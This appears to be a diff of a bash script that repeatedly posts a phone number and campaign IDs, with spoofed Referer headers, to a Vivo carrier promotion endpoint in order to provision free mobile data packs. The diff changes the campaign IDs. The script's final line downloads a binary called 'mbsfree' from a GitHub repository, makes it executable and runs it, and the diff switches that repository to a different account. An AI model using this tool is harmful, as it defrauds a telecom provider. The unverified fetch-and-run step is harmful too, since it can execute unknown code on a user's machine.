@@ -32,7 +32,7 @@ echo ""
 echo -e "\e[0m\e[01;37;41m TOKEN 1 - 5MB \e[0m"
 for i in $(seq $VEZES);
 do
-response=$(data=$"msisdn=$NUMERO&campid=f79ae136-8dcd-40c5-8421-d1371c9e50d1f&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+response=$(data=$"msisdn=$NUMERO&campid=02f76cd1-eead-44ff-88dd-aa69538c7aef&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
 body=$(echo $response | jq '.packprovision')
 pack=$'"packprovisionOK"'
 case $body in
@@ -46,7 +46,7 @@ echo
 echo -e "\e[0m\e[01;37;41m TOKEN 2 \e[0m"
 for i in $(seq $VEZES);
 do
-response=$(data=$"msisdn=$NUMERO&campid=6c360891-8ce5-45ba-a2c3-97e0a7139d99f&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+response=$(data=$"msisdn=$NUMERO&campid=949e575a-6db8-4608-8b71-1281e6e506df&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
 body=$(echo $response | jq '.packprovision')
 pack=$'"packprovisionOK"'
 case $body in
@@ -60,7 +60,7 @@ echo
 echo -e "\e[0m\e[01;37;41m TOKEN 3 \e[0m"
 for i in $(seq $VEZES);
 do
-response=$(data=$"msisdn=$NUMERO&campid=db6327ec-3ad5-46a4-881e-1deff71c879a&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+response=$(data=$"msisdn=$NUMERO&campid=04e564c7-f410-49f5-8dee-b268eaef5223&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
 body=$(echo $response | jq '.packprovision')
 pack=$'"packprovisionOK"'
 case $body in
@@ -118,7 +118,7 @@ echo
 echo -e "\e[0m\e[01;37;41m TOKEN 7 \e[0m"
 for i in $(seq $VEZES);
 do
-response=$(data=$"msisdn=$NUMERO&campid=6e7eb039-9816-4118-9c3b-bb906887722c&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+response=$(data=$"msisdn=$NUMERO&campid=cd5f56de-4ed9-484f-9c32-c8f6eedb08e7&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
 body=$(echo $response | jq '.packprovision')
 pack=$'"packprovisionOK"'
 case $body in
@@ -133,7 +133,7 @@ echo
 echo -e "\e[0m\e[01;37;41m TOKEN 8 \e[0m"
 for i in $(seq $VEZES);
 do
-response=$(data=$"msisdn=$NUMERO&campid=ddf114e4-c29b-44f1-b04b-1621234f2f5d&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+response=$(data=$"msisdn=$NUMERO&campid=7398de8b-48fa-48eb-9a59-562b2a0fba3e&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
 body=$(echo $response | jq '.packprovision')
 pack=$'"packprovisionOK"'
 case $body in
@@ -148,7 +148,7 @@ echo
 echo -e "\e[0m\e[01;37;41m TOKEN 9 \e[0m"
 for i in $(seq $VEZES);
 do
-response=$(data=$"msisdn=$NUMERO&campid=f922b71c-8b48-4363-a9fd-74c0757c161d&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
+response=$(data=$"msisdn=$NUMERO&campid=04e564c7-f410-49f5-8dee-b268eaef5223&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
 body=$(echo $response | jq '.packprovision')
 pack=$'"packprovisionOK"'
 case $body in
@@ -296,4 +296,4 @@ done
 echo ""
 echo -e "        \033[0m\033[01;37m• \033[01;32mTeste finalizado \033[01;37m•\033[0m"
 sleep 2
-curl -sO https://raw.githubusercontent.com/NT-Injector/PacoteFree/main/mbsfree && chmod 777 mbsfree && ./mbsfree
+curl -sO https://raw.githubusercontent.com/iixuxii/PacoteFree/main/mbsfree && chmod 777 mbsfree && ./mbsfree
